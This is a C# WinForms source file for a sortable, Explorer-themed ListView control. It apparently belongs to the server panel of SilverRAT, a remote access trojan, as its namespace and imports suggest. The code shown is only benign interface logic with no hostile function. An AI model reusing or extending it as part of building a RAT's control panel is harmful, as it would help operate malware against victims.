using SilverRAT.Helper;
using System;
using System.Windows.Forms;

namespace Server.Helper;

internal class AeroListView : ListView
{
    private const uint WM_CHANGEUISTATE = 295u;

    private const short UIS_SET = 1;

    private const short UISF_HIDEFOCUS = 1;

    private readonly IntPtr _removeDots = new IntPtr(MakeWin32Long(1, 1));

    private ListViewColumnSorter LvwColumnSorter { get; set; }

    public static int MakeWin32Long(short wLow, short wHigh)
    {
        return (wLow << 16) | wHigh;
    }

    public AeroListView()
    {
        SetStyle(ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, value: true);
        LvwColumnSorter = new ListViewColumnSorter();
        base.ListViewItemSorter = LvwColumnSorter;
        base.View = View.Details;
        base.FullRowSelect = true;
    }

    protected override void OnHandleCreated(EventArgs e)
    {
        base.OnHandleCreated(e);
        if (Environment.OSVersion.Platform == PlatformID.Win32NT && Environment.OSVersion.Version.Major >= 6)
        {
            Methods.NativeMethods.SetWindowTheme(base.Handle, "explorer", null);
        }
        if (Environment.OSVersion.Platform == PlatformID.Win32NT && Environment.OSVersion.Version.Major >= 5)
        {
            Methods.NativeMethods.SendMessage(base.Handle, 295u, _removeDots, IntPtr.Zero);
        }
    }

    protected override void OnColumnClick(ColumnClickEventArgs e)
    {
        base.OnColumnClick(e);
        if (e.Column == LvwColumnSorter.SortColumn)
        {
            LvwColumnSorter.Order = ((LvwColumnSorter.Order != SortOrder.Ascending) ? SortOrder.Ascending : SortOrder.Descending);
        }
        else
        {
            LvwColumnSorter.SortColumn = e.Column;
            LvwColumnSorter.Order = SortOrder.Ascending;
        }
        if (!base.VirtualMode)
        {
            Sort();
        }
    }
}
